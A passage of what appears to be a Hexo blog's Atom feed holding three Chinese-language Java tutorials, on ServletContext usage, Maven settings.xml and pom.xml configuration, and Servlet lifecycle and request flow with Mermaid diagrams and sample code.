    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-ServletContext简介"><a href="#1-ServletContext简介" class="headerlink" title="1. ServletContext简介"></a>1. ServletContext简介</h2><p>ServletContext代表整个Web应用程序，每个Web应用程序只有一个ServletContext对象。它是在Web容器启动时创建，在Web容器关闭时销毁。ServletContext提供了一个跨整个应用程序的共享环境。</p><h2 id="2-获取ServletContext的方法"><a href="#2-获取ServletContext的方法" class="headerlink" title="2. 获取ServletContext的方法"></a>2. 获取ServletContext的方法</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方法1：通过HttpServlet获取</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2：通过ServletConfig获取</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> getServletConfig().getServletContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法3：通过HttpServletRequest获取</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法4：通过HttpSession获取</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> session.getServletContext();</span><br></pre></td></tr></table></figure></div><h2 id="3-ServletContext主要功能"><a href="#3-ServletContext主要功能" class="headerlink" title="3. ServletContext主要功能"></a>3. ServletContext主要功能</h2><h3 id="3-1-应用程序范围内的初始化参数"><a href="#3-1-应用程序范围内的初始化参数" class="headerlink" title="3.1 应用程序范围内的初始化参数"></a>3.1 应用程序范围内的初始化参数</h3><p>在web.xml中配置：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>appName<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>MyWebApp<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>在Servlet中使用：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">appName</span> <span class="operator">=</span> servletContext.getInitParameter(<span class="string">&quot;appName&quot;</span>);</span><br><span class="line">Enumeration&lt;String&gt; paramNames = servletContext.getInitParameterNames();</span><br></pre></td></tr></table></figure></div><h3 id="3-2-属性管理"><a href="#3-2-属性管理" class="headerlink" title="3.2 属性管理"></a>3.2 属性管理</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置属性</span></span><br><span class="line">servletContext.setAttribute(<span class="string">&quot;userCount&quot;</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取属性</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">userCount</span> <span class="operator">=</span> (Integer) servletContext.getAttribute(<span class="string">&quot;userCount&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除属性</span></span><br><span class="line">servletContext.removeAttribute(<span class="string">&quot;userCount&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取所有属性名</span></span><br><span class="line">Enumeration&lt;String&gt; attrNames = servletContext.getAttributeNames();</span><br></pre></td></tr></table></figure></div><h3 id="3-3-资源访问"><a href="#3-3-资源访问" class="headerlink" title="3.3 资源访问"></a>3.3 资源访问</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取资源文件的真实路径</span></span><br><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> servletContext.getRealPath(<span class="string">&quot;/WEB-INF/config.properties&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取资源文件的URL</span></span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> servletContext.getResource(<span class="string">&quot;/WEB-INF/config.properties&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取资源流</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> servletContext.getResourceAsStream(<span class="string">&quot;/WEB-INF/config.properties&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取指定路径下的所有资源</span></span><br><span class="line">Set&lt;String&gt; paths = servletContext.getResourcePaths(<span class="string">&quot;/WEB-INF/&quot;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="3-4-日志记录"><a href="#3-4-日志记录" class="headerlink" title="3.4 日志记录"></a>3.4 日志记录</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">servletContext.log(<span class="string">&quot;用户登录成功&quot;</span>);</span><br><span class="line">servletContext.log(<span class="string">&quot;数据库连接失败&quot;</span>, <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;Connection refused&quot;</span>));</span><br></pre></td></tr></table></figure></div><h3 id="3-5-请求转发"><a href="#3-5-请求转发" class="headerlink" title="3.5 请求转发"></a>3.5 请求转发</h3><p>ServletContext 提供了请求转发的功能，可以将请求转发到其他 Servlet、JSP 或者静态资源。</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取 RequestDispatcher</span></span><br><span class="line"><span class="type">RequestDispatcher</span> <span class="variable">dispatcher</span> <span class="operator">=</span> servletContext.getRequestDispatcher(<span class="string">&quot;/target&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转发请求</span></span><br><span class="line">dispatcher.forward(request, response);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 包含其他资源的内容</span></span><br><span class="line">dispatcher.include(request, response);</span><br></pre></td></tr></table></figure></div><p>实际使用示例：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/source&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SourceServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 设置请求属性</span></span><br><span class="line">        request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Hello from SourceServlet&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取 RequestDispatcher</span></span><br><span class="line">        <span class="type">RequestDispatcher</span> <span class="variable">dispatcher</span> <span class="operator">=</span> getServletContext()</span><br><span class="line">            .getRequestDispatcher(<span class="string">&quot;/target&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 转发请求</span></span><br><span class="line">        dispatcher.forward(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/target&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TargetServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 获取转发的属性</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> (String) request.getAttribute(<span class="string">&quot;message&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h2&gt;Target Servlet&lt;/h2&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;p&gt;转发消息: &quot;</span> + message + <span class="string">&quot;&lt;/p&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>请求转发的特点：</p><ol><li>URL 不会改变，客户端感知不到转发的发生</li><li>只能转发到同一个 Web 应用中的资源</li><li>请求属性会被保留并传递给目标资源</li><li>可以使用相对路径或绝对路径（以”&#x2F;“开头）</li></ol><p>注意事项：</p><ol><li>forward() 方法调用后，原始的响应内容会被清空</li><li>在调用 forward() 之前不要提交响应</li><li>include() 方法可以将目标资源的输出添加到当前响应中</li><li>避免循环转发导致死循环</li></ol><h2 id="4-最佳实践建议"><a href="#4-最佳实践建议" class="headerlink" title="4. 最佳实践建议"></a>4. 最佳实践建议</h2><ol><li><p><strong>属性管理</strong>：</p><ul><li>只存储应用程序级别的数据</li><li>避免存储过大的对象</li><li>及时清理不再使用的属性</li></ul></li><li><p><strong>资源访问</strong>：</p><ul><li>使用相对路径访问资源</li><li>注意资源流的关闭</li><li>缓存频繁访问的资源路径</li></ul></li><li><p><strong>日志使用</strong>：</p><ul><li>记录重要的应用程序事件</li><li>包含足够的上下文信息</li><li>适当使用异常堆栈信息</li></ul></li><li><p><strong>性能考虑</strong>：</p><ul><li>避免频繁读写ServletContext属性</li><li>合理使用初始化参数</li><li>注意线程安全问题</li></ul></li></ol><h2 id="5-注意事项"><a href="#5-注意事项" class="headerlink" title="5. 注意事项"></a>5. 注意事项</h2><ol><li>ServletContext是线程不安全的，在并发访问时需要注意同步问题</li><li>避免在ServletContext中存储用户级别的数据</li><li>初始化参数在应用启动后不可修改</li><li>资源路径要使用Web应用程序根目录作为基准</li><li>及时释放通过ServletContext获取的资源</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="servlet" scheme="http://example.com/tags/servlet/"/>
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Maven配置详解</title>
    <link href="http://example.com/2025/03/31/java/maven/maven%E9%85%8D%E7%BD%AE/"/>
    <id>http://example.com/2025/03/31/java/maven/maven%E9%85%8D%E7%BD%AE/</id>
    <published>2025-03-31T21:33:21.000Z</published>
    <updated>2025-04-05T11:38:59.690Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Maven配置详解"><a href="#Maven配置详解" class="headerlink" title="Maven配置详解"></a>Maven配置详解</h1><h2 id="1-settings-xml-配置"><a href="#1-settings-xml-配置" class="headerlink" title="1. settings.xml 配置"></a>1. settings.xml 配置</h2><p>Maven的配置文件主要是 settings.xml，通常有两个位置：</p><ul><li>全局配置：<code>$&#123;maven.home&#125;/conf/settings.xml</code></li><li>用户配置：<code>$&#123;user.home&#125;/.m2/settings.xml</code></li></ul><h3 id="1-1-基本配置项"><a href="#1-1-基本配置项" class="headerlink" title="1.1 基本配置项"></a>1.1 基本配置项</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 本地仓库路径配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">localRepository</span>&gt;</span>D:/maven/repository<span class="tag">&lt;/<span class="name">localRepository</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 镜像配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyun<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>阿里云公共仓库<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 代理配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">proxies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>optional<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">active</span>&gt;</span>true<span class="tag">&lt;/<span class="name">active</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">protocol</span>&gt;</span>http<span class="tag">&lt;/<span class="name">protocol</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">host</span>&gt;</span>proxy.somewhere.com<span class="tag">&lt;/<span class="name">host</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">port</span>&gt;</span>8080<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">proxies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="2-pom-xml-配置"><a href="#2-pom-xml-配置" class="headerlink" title="2. pom.xml 配置"></a>2. pom.xml 配置</h2><h3 id="2-1-基础配置"><a href="#2-1-基础配置" class="headerlink" title="2.1 基础配置"></a>2.1 基础配置</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 项目坐标 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>demo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 项目依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="2-2-属性配置"><a href="#2-2-属性配置" class="headerlink" title="2.2 属性配置"></a>2.2 属性配置</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">spring.version</span>&gt;</span>5.3.9<span class="tag">&lt;/<span class="name">spring.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="3-常用Maven命令"><a href="#3-常用Maven命令" class="headerlink" title="3. 常用Maven命令"></a>3. 常用Maven命令</h2><ul><li><code>mvn clean</code>: 清理项目</li><li><code>mvn compile</code>: 编译项目</li><li><code>mvn test</code>: 运行测试</li><li><code>mvn package</code>: 打包项目</li><li><code>mvn install</code>: 安装到本地仓库</li><li><code>mvn deploy</code>: 部署到远程仓库</li></ul><h2 id="4-生命周期"><a href="#4-生命周期" class="headerlink" title="4. 生命周期"></a>4. 生命周期</h2><p>Maven的生命周期分为三个标准周期：</p><ol><li>clean: 清理项目</li><li>default: 构建项目</li><li>site: 生成项目站点</li></ol><h2 id="5-仓库配置"><a href="#5-仓库配置" class="headerlink" title="5. 仓库配置"></a>5. 仓库配置</h2><h3 id="5-1-仓库类型"><a href="#5-1-仓库类型" class="headerlink" title="5.1 仓库类型"></a>5.1 仓库类型</h3><ul><li>本地仓库</li><li>远程仓库<ul><li>中央仓库</li><li>私服</li><li>其他公共仓库</li></ul></li></ul><h3 id="5-2-私服配置示例"><a href="#5-2-私服配置示例" class="headerlink" title="5.2 私服配置示例"></a>5.2 私服配置示例</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Nexus Repository<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://nexus.example.com/repository/maven-public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="6-插件配置"><a href="#6-插件配置" class="headerlink" title="6. 插件配置"></a>6. 插件配置</h2><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">source</span>&gt;</span>$&#123;java.version&#125;<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span>&gt;</span>$&#123;java.version&#125;<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="maven" scheme="http://example.com/tags/maven/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="构建工具" scheme="http://example.com/tags/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Servlet实现原理</title>
    <link href="http://example.com/2025/03/31/java/servlet/servlet/"/>
    <id>http://example.com/2025/03/31/java/servlet/servlet/</id>
    <published>2025-03-31T20:21:01.000Z</published>
    <updated>2025-04-05T11:38:59.690Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-Servlet生命周期"><a href="#1-Servlet生命周期" class="headerlink" title="1. Servlet生命周期"></a>1. Servlet生命周期</h2><pre class="mermaid">graph TB    A[服务器启动] --> B{是否配置load-on-startup?}    B -->|是| C[初始化Servlet]    B -->|否| D[等待首次请求]    D --> C    C --> E[执行init方法]    E --> F[等待请求]    F --> G[执行service方法]    G --> F    H[服务器关闭] --> I[执行destroy方法]</pre><h2 id="2-请求处理流程"><a href="#2-请求处理流程" class="headerlink" title="2. 请求处理流程"></a>2. 请求处理流程</h2><pre class="mermaid">sequenceDiagram    participant Client as 客户端    participant Server as Web服务器    participant Container as Servlet容器    participant Servlet as Servlet实例    Client->>Server: HTTP请求    Server->>Container: 转发请求    Container->>Container: 创建Request对象    Container->>Container: 创建Response对象    Container->>Servlet: 调用service()    Servlet->>Servlet: 根据请求方法调用do*()    Servlet-->>Container: 返回处理结果    Container-->>Server: 处理响应    Server-->>Client: HTTP响应</pre><h2 id="3-Servlet容器架构"><a href="#3-Servlet容器架构" class="headerlink" title="3. Servlet容器架构"></a>3. Servlet容器架构</h2><pre class="mermaid">graph LR    A[Web容器] --> B[生命周期管理]    A --> C[请求处理]    A --> D[多线程管理]    A --> E[安全控制]        B --> B1[初始化]    B --> B2[服务]    B --> B3[销毁]        C --> C1[请求分发]    C --> C2[响应处理]</pre><h2 id="4-过滤器链执行流程"><a href="#4-过滤器链执行流程" class="headerlink" title="4. 过滤器链执行流程"></a>4. 过滤器链执行流程</h2><pre class="mermaid">graph LR    A[请求] --> B[Filter1]    B --> C[Filter2]    C --> D[Filter3]    D --> E[Servlet]    E --> F[Filter3]    F --> G[Filter2]    G --> H[Filter1]    H --> I[响应]</pre><h2 id="5-核心组件关系"><a href="#5-核心组件关系" class="headerlink" title="5. 核心组件关系"></a>5. 核心组件关系</h2><pre class="mermaid">classDiagram    class ServletContext {        +getInitParameter()        +getAttribute()        +setAttribute()    }    class ServletConfig {        +getServletName()        +getInitParameter()    }    class HttpServlet {        +init()        +service()        +destroy()    }    class HttpServletRequest {        +getParameter()        +getSession()        +getAttribute()    }    class HttpServletResponse {        +setContentType()        +getWriter()        +sendRedirect()    }        ServletConfig --> ServletContext    HttpServlet --> ServletConfig    HttpServlet --> HttpServletRequest    HttpServlet --> HttpServletResponse</pre><h2 id="6-请求分发过程"><a href="#6-请求分发过程" class="headerlink" title="6. 请求分发过程"></a>6. 请求分发过程</h2><pre class="mermaid">stateDiagram-v2    [*] --> 接收请求    接收请求 --> URL映射    URL映射 --> 创建请求响应对象    创建请求响应对象 --> 调用Servlet    调用Servlet --> 处理请求    处理请求 --> 生成响应    生成响应 --> [*]</pre><h2 id="7-关键代码示例"><a href="#7-关键代码示例" class="headerlink" title="7. 关键代码示例"></a>7. 关键代码示例</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="comment">// 初始化方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="built_in">super</span>.init(config);</span><br><span class="line">        <span class="comment">// 初始化代码</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理GET请求</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;Servlet示例&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 销毁方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 清理资源</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="8-web-xml配置示例"><a href="#8-web-xml配置示例" class="headerlink" title="8. web.xml配置示例"></a>8. web.xml配置示例</h2><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>exampleServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.ExampleServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>exampleServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/example/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>以上流程图清晰地展示了Servlet的实现原理，包括生命周期、请求处理流程、容器架构、过滤器链等关键概念。使用图表可以更直观地理解Servlet的工作方式.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
